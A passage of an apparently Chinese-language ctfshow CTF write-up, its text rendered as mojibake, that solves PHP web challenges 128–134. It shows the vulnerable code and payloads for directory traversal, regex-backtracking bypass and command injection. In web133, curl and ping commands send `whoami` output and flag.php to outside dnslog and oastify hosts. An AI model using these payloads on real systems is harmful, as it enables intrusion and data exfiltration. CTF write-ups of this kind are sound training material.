constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$f1</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$f2</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">check</span><span class="token punctuation">(</span><span class="token variable">$f1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$f1</span><span class="token punctuation">,</span><span class="token variable">$f2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"å—¯å“¼ï¼Ÿ"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">check</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[0-9]|[a-z]/i'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><p><a href="https://www.cnblogs.com/lost-1987/articles/3309693.html">å…³äºphpä¸­gettextçš„ç”¨æ³•ï¼Ÿ</a></p><p>å°çŸ¥è¯†ç‚¹ï¼š _()æ˜¯ä¸€ä¸ªå‡½æ•°</p><p><strong>_()&#x3D;&#x3D;gettext()</strong> æ˜¯gettext()çš„æ‹“å±•å‡½æ•°ï¼Œå¼€å¯textæ‰©å±•ã€‚éœ€è¦phpæ‰©å±•ç›®å½•ä¸‹æœ‰php_gettext.dll</p><p>**get_defined_vars()**å‡½æ•°</p><p>get_defined_vars â€”&gt;è¿”å›ç”±æ‰€æœ‰å·²å®šä¹‰å˜é‡æ‰€ç»„æˆçš„æ•°ç»„ è¿™æ ·å¯ä»¥è·å¾— $flag</p><p>Payload: <code>?f1=_&amp;f2=get_defined_vars</code></p><h4 id="web129-stripos-ç›®å½•ç©¿è¶Š"><a href="#web129-stripos-ç›®å½•ç©¿è¶Š" class="headerlink" title="web129(stripos  ç›®å½•ç©¿è¶Š)"></a>web129(stripos  ç›®å½•ç©¿è¶Š)</h4><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$f</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">stripos</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'ctfshow'</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token function">readfile</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> </span></code></pre><p>stripos() å‡½æ•°æŸ¥æ‰¾å­—ç¬¦ä¸²åœ¨å¦ä¸€å­—ç¬¦ä¸²ä¸­ç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½®ï¼ˆä¸åŒºåˆ†å¤§å°å†™ï¼‰ã€‚å¦‚æœæ²¡æœ‰æ‰¾åˆ°å­—ç¬¦ä¸²åˆ™è¿”å› FALSEã€‚</p><p><strong>æ³¨é‡Šï¼š</strong>stripos() å‡½æ•°æ˜¯ä¸åŒºåˆ†å¤§å°å†™çš„ã€‚</p><p><strong>æ³¨é‡Šï¼š</strong>è¯¥å‡½æ•°æ˜¯äºŒè¿›åˆ¶å®‰å…¨çš„ã€‚</p><p>ç›®å½•ç©¿è¶Š</p><p>Payload:</p><blockquote><p>?f&#x3D;.&#x2F;ctfshow&#x2F;..&#x2F;flag.php</p><p>?f&#x3D;.&#x2F;ctfshow&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php </p></blockquote><h4 id="web130"><a href="#web130" class="headerlink" title="web130"></a>web130</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$f</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/.+?ctfshow/is'</span><span class="token punctuation">,</span> <span class="token variable">$f</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'bye!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">stripos</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'ctfshow'</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token constant boolean">FALSE</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'bye!!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> </span></code></pre><p>1ï¼‰ç¬¬ä¸€ä¸ªåˆ¤æ–­ã€‚<br>.+?è¡¨ç¤ºåŒ¹é…ä»»æ„å­—ç¬¦ä¸€ä¸ªæˆ–åˆ™å¤šä¸ªã€‚<br>.*? è¡¨ç¤ºåŒ¹é…ä»»æ„å­—ç¬¦0ä¸ªæˆ–å¤šä¸ªã€‚</p><p>. åŒ¹é…é™¤æ¢è¡Œç¬¦ \n ä¹‹å¤–çš„ä»»ä½•å•å­—ç¬¦ã€‚</p><ul><li>åŒ¹é…å‰é¢çš„å­è¡¨è¾¾å¼ä¸€æ¬¡æˆ–å¤šæ¬¡ã€‚<br>? åŒ¹é…å‰é¢çš„å­è¡¨è¾¾å¼é›¶æ¬¡æˆ–ä¸€æ¬¡ï¼Œæˆ–æŒ‡æ˜ä¸€ä¸ªéè´ªå©ªé™å®šç¬¦ã€‚<br>&#x2F;iä¸åŒºåˆ†å¤§å°å†™<br>&#x2F;s åŒ¹é…ä»»ä½•ç©ºç™½å­—ç¬¦ï¼ŒåŒ…æ‹¬ç©ºæ ¼ã€åˆ¶è¡¨ç¬¦ã€æ¢é¡µç¬¦ç­‰ç­‰ã€‚<br>é¢˜ä¸­æ•´ä¸ªæ­£åˆ™è¡¨è¾¾å¼çš„æ„æ€å°±æ˜¯ï¼Œä»¥ä»»æ„ä¸€ä¸ªæˆ–å¤šä¸ªå­—ç¬¦å¼€å¤´ï¼Œé‡åˆ°ctfshowå°±åŒ¹é…ï¼Œä¸åŒºåˆ†å¤§å°å†™ï¼Œä¸èƒ½æœ‰ä»»ä½•ç©ºç™½å­—ç¬¦ã€‚</li></ul><p>ä¹Ÿå°±æ˜¯è¯´è¾“å…¥çš„å†…å®¹é‡Œï¼Œctfshowå‰é¢ä¸èƒ½æœ‰å­—ç¬¦ã€‚</p><p>2ï¼‰ç¬¬äºŒä¸ªåˆ¤æ–­ã€‚striposå‡½æ•°å¦‚æœæœªå‘ç°å­—ç¬¦ä¸²å°†è¿”å› FALSEã€‚<br>å…¨ç­‰äºçš„æ¡ä»¶æ˜¯å¿…é¡»åŒæ–¹çš„ç±»å‹ä¹Ÿä¸€æ ·ï¼Œæ‰€ä»¥ctfshowåœ¨é¦–ä½è¿”å›çš„0ä¸FLASEä¸å…¨ç­‰ã€‚</p><p>æ‰€ä»¥payload:<code>POST:f=ctfshow</code></p><h4 id="web131-æ­£åˆ™æœ€å¤§å›æº¯"><a href="#web131-æ­£åˆ™æœ€å¤§å›æº¯" class="headerlink" title="web131(æ­£åˆ™æœ€å¤§å›æº¯)"></a>web131(æ­£åˆ™æœ€å¤§å›æº¯)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$f</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/.+?ctfshow/is'</span><span class="token punctuation">,</span> <span class="token variable">$f</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'bye!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">stripos</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'36Dctfshow'</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token constant boolean">FALSE</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'bye!!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><p><a href="https://www.laruence.com/2010/06/08/1579.html">æ·±æ‚‰æ­£åˆ™(pcre)æœ€å¤§å›æº¯&#x2F;é€’å½’é™åˆ¶</a></p><p>åœ¨phpä¸­æ­£åˆ™è¡¨è¾¾å¼è¿›è¡ŒåŒ¹é…æœ‰ä¸€å®šçš„é™åˆ¶ï¼Œè¶…è¿‡é™åˆ¶ç›´æ¥è¿”å›false</p><p>Poc</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token comment"># Construct the payload</span>preg <span class="token operator">=</span> <span class="token string">'very'</span> <span class="token operator">*</span> <span class="token number">250000</span> <span class="token operator">+</span> <span class="token string">'36Dctfshow'</span>payload <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'f'</span><span class="token punctuation">:</span> preg<span class="token punctuation">&#125;</span><span class="token comment"># The target URL</span>url <span class="token operator">=</span> <span class="token string">'https://b8e115f7-c0eb-4c76-9dd8-840b15166fb3.challenge.ctf.show/'</span><span class="token comment"># Send the POST request</span>response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>payload<span class="token punctuation">)</span><span class="token comment"># Check for errors and print the response</span><span class="token keyword">if</span> response<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Response:'</span><span class="token punctuation">,</span> response<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Failed to get a valid response. Status code:'</span><span class="token punctuation">,</span> response<span class="token punctuation">.</span>status_code<span class="token punctuation">)</span></code></pre><h4 id="web132-PHPé€»è¾‘è¿ç®—ç¬¦ç»•è¿‡"><a href="#web132-PHPé€»è¾‘è¿ç®—ç¬¦ç»•è¿‡" class="headerlink" title="web132(PHPé€»è¾‘è¿ç®—ç¬¦ç»•è¿‡)"></a>web132(PHPé€»è¾‘è¿ç®—ç¬¦ç»•è¿‡)</h4><p>è®¿é—®<code>robots.txt</code>â€“&gt;<code>/admin</code></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$code</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$code</span> <span class="token operator">===</span> <span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0x36D</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$password</span> <span class="token operator">===</span> <span class="token variable">$flag</span> <span class="token operator">||</span> <span class="token variable">$username</span> <span class="token operator">===</span><span class="token string double-quoted-string">"admin"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$code</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> </code></pre><p><a href="https://www.cnblogs.com/hurry-up/p/10220082.html">PHPä¸­é€»è¾‘è¿ç®—ç¬¦çš„é«˜æ•ˆç”¨æ³•â€”&amp;&amp;å’Œ||</a></p><p>å¯¹äºâ€œä¸â€ï¼ˆ**&amp;&amp;<strong>ï¼‰ è¿ç®—ï¼š <strong>x &amp;&amp; y</strong> å½“</strong>x<strong>ä¸º</strong>false<strong>æ—¶ï¼Œç›´æ¥è·³è¿‡ï¼Œä¸æ‰§è¡Œ</strong>y<strong>ï¼›<br>å¯¹äºâ€œæˆ–â€ï¼ˆ</strong>||<strong>ï¼‰ è¿ç®— ï¼š  <strong>x||y</strong> å½“</strong>x<strong>ä¸º</strong>true<strong>æ—¶ï¼Œç›´æ¥è·³è¿‡ï¼Œä¸æ‰§è¡Œ</strong>y**ã€‚</p><p>æ‰€ä»¥payloadï¼š<code>?code=admin&amp;password=1&amp;username=admin</code></p><h4 id="web133-substrç»•è¿‡-DNSlog-Collaborator-Client"><a href="#web133-substrç»•è¿‡-DNSlog-Collaborator-Client" class="headerlink" title="web133(substrç»•è¿‡ DNSlog Collaborator Client)"></a>web133(substrç»•è¿‡ DNSlog Collaborator Client)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//flag.php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$F</span> <span class="token operator">=</span> @<span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'F'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/system|nc|wget|exec|passthru|netcat/i'</span><span class="token punctuation">,</span> <span class="token variable">$F</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$F</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"6ä¸ªå­—æ¯éƒ½è¿˜ä¸å¤Ÿå‘€?!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span></span></code></pre><p>æˆ‘ä»¬ä¼ é€’?F&#x3D;<code>$F</code>;+sleep 3å¥½åƒç½‘ç«™ç¡®å®sleepäº†ä¸€ä¼šè¯´æ˜çš„ç¡®æ‰§è¡Œäº†å‘½ä»¤<br>é‚£ä¸ºä»€ä¹ˆä¼šè¿™æ ·ï¼Ÿ<br>å› ä¸ºæ˜¯æˆ‘ä»¬ä¼ é€’çš„<code>$F</code>;+sleep 3ã€‚å…ˆè¿›è¡Œsubstr()å‡½æ•°æˆªæ–­ç„¶åå»æ‰§è¡Œeval()å‡½æ•°<br>è¿™ä¸ªå‡½æ•°çš„ä½œç”¨æ˜¯æ‰§è¡Œphpä»£ç ï¼Œæ˜¯shell_exec()å‡½æ•°çš„ç¼©å†™ï¼Œç„¶åå°±å»å‘½ä»¤æ‰§è¡Œã€‚<br>è€Œ$Få°±æ˜¯æˆ‘ä»¬è¾“å…¥çš„<code>$F</code>;+sleep 3 ä½¿ç”¨æœ€åæ‰§è¡Œçš„ä»£ç åº”è¯¥æ˜¯<br><code>$F</code>;+sleep 3,å°±æ‰§è¡ŒæˆåŠŸ<br>è¿™é‡Œå¯èƒ½æœ‰ç‚¹ç»•ï¼Œæ…¢æ…¢ç†è§£</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$F</span> <span class="token operator">=</span> @<span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'F'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">//?F=`$F`; sleep 3</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$F</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// `$F`; </span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$F</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// eval("`$F`; "); -> eval("``$F`; sleep 3`; "); "`" åªä¼šè¢«å±•å¼€ä¸€æ¬¡</span></code></pre><blockquote><p>åˆ©ç”¨<code>$F</code>;è®©evalæ‰§è¡Œshellè¯­å¥ã€‚<br>è¿™ä¸€ä¸²å­—ç¬¦é•¿åº¦æ˜¯5ï¼ŒåŠ ä¸ªç©ºæ ¼ï¼Œæ»¡è¶³substrçš„6ä¸ªå­—ç¬¦æˆªå–ï¼Œè®©evalæ‰§è¡Œ<code>$F</code>;</p><p>å¦‚ä¼ é€’<code>$F</code>;+sleep 3ï¼Œé¡µé¢ä¼šsleepä¸€ä¼šã€‚å…·ä½“æ‰§è¡Œè¿‡ç¨‹å¦‚ä¸‹ï¼š<br>&#x3D;&#x3D;&gt;php:   eval(substr($F,0,6));<br>&#x3D;&#x3D;&gt;php:   eval(â€œ<code>$F</code>; â€œ);<br>&#x3D;&#x3D;&gt;php:   eval(â€œ&#96;&#96;$F<code>; sleep 3</code>; â€œ);<br>&#x3D;&#x3D;&gt;shell: <code>$F</code>; sleep 3<br>æ‰€ä»¥å°±æ‰§è¡Œäº†sleep 3</p></blockquote><p>æ–¹æ³•ä¸€(DNSlogå¤–å¸¦)ï¼šï¼ˆæ²¡æˆåŠŸï¼‰</p><p><a href="http://www.dnslog.cn/">åœ¨çº¿DNSlog</a></p><p>å…ˆå¾—åˆ°ä¸€ä¸ªåŸŸåï¼Œç„¶ååˆ©ç”¨dnslogå®ç°å‘½ä»¤å›æ˜¾ã€‚</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> http://haha.0iix2r.dnslog.cn/<span class="token variable"><span class="token variable">`</span><span class="token function">whoami</span><span class="token variable">`</span></span><span class="token function">ping</span> <span class="token variable"><span class="token variable">`</span><span class="token function">whoami</span><span class="token variable">`</span></span>.0iix2r.dnslog.cn</code></pre><p>Payload:</p><p>å½“pingä¸€ä¸ªåŸŸåæ—¶ä¼šå¯¹å…¶è¿›è¡Œä¸€ä¸ªé€’å½’ DNS æŸ¥è¯¢çš„è¿‡ç¨‹ï¼Œè¿™ä¸ªæ—¶å€™å°±èƒ½åœ¨åç«¯è·å–åˆ° DNS çš„æŸ¥è¯¢è¯·æ±‚ï¼Œå½“å‘½ä»¤çœŸæ­£è¢«æ‰§è¡Œä¸”å¹³å°æ”¶åˆ°å›æ˜¾æ—¶å°±èƒ½è¯´æ˜æ¼æ´ç¡®å®å­˜åœ¨ã€‚</p><p>flag.phpæ˜¯å¤šè¡Œï¼Œéœ€è¦grepä¸€ä¸‹ï¼Œå…¶æ¬¡ä¸èƒ½å«æœ‰ç‰¹æ®Šç¬¦å·ï¼Œæ‰€ä»¥trè®¾ç½®ä¸€ä¸‹è¿”å›ç»“æœåªæºå¸¦å­—æ¯å’Œæ•°å­—ã€‚</p><pre class="language-bash" data-language="bash"><code class="language-bash">?F<span class="token operator">=</span><span class="token variable"><span class="token variable">`</span>$F<span class="token variable">`</span></span><span class="token punctuation">;</span> <span class="token function">ping</span> <span class="token variable"><span class="token variable">`</span><span class="token function">cat</span> flag.php <span class="token operator">|</span> <span class="token function">grep</span> ctfshow <span class="token operator">|</span> <span class="token function">tr</span> <span class="token parameter variable">-cd</span> <span class="token string">'[a-z]'</span>/<span class="token string">'[0-9]'</span><span class="token variable">`</span></span>.3aqybg.dnslog.cn <span class="token parameter variable">-c</span> <span class="token number">1</span></code></pre><p>æ–¹æ³•äºŒ( Collaborator Client Curl -F):</p><p>ä½¿ç”¨curl -Få‘½ä»¤ã€‚-F ä¸ºå¸¦æ–‡ä»¶çš„å½¢å¼å‘é€postè¯·æ±‚ã€‚</p><p>Payload:</p><pre class="language-bash" data-language="bash"><code class="language-bash">?F<span class="token operator">=</span><span class="token variable"><span class="token variable">`</span>$F<span class="token variable">`</span></span><span class="token punctuation">;</span>+curl <span class="token parameter variable">-X</span> POST <span class="token parameter variable">-F</span> <span class="token assign-left variable">xx</span><span class="token operator">=</span>@flag.php  http://smiegnphdyy8keqa8wcuo4ypfgl790xp.oastify.com</code></pre><p><img src="web133.png" loading="lazy"></p><h4 id="web134-å˜é‡è¦†ç›–"><a href="#web134-å˜é‡è¦†ç›–" class="headerlink" title="web134(å˜é‡è¦†ç›–)"></a>web134(å˜é‡è¦†ç›–)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$key1</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$key2</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"nonononono"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>@<span class="token function">parse_str</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'QUERY_STRING'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$key1</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'36d'</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$key2</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'36d'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>çœ‹åˆ°parse_strå’Œextractã€‚å˜é‡è¦†ç›–<br>ç¬¬ä¸€æ¡ifåˆ¤æ–­ï¼Œè¦æ±‚key1å’Œkey2ä¸èƒ½é€šè¿‡getå’Œpostä¼ é€’ã€‚</p><p>parse_stræ˜¯å¯¹getè¯·æ±‚è¿›è¡Œçš„å†…å®¹è§£ææˆå˜é‡ã€‚ä¾‹å¦‚ä¼ 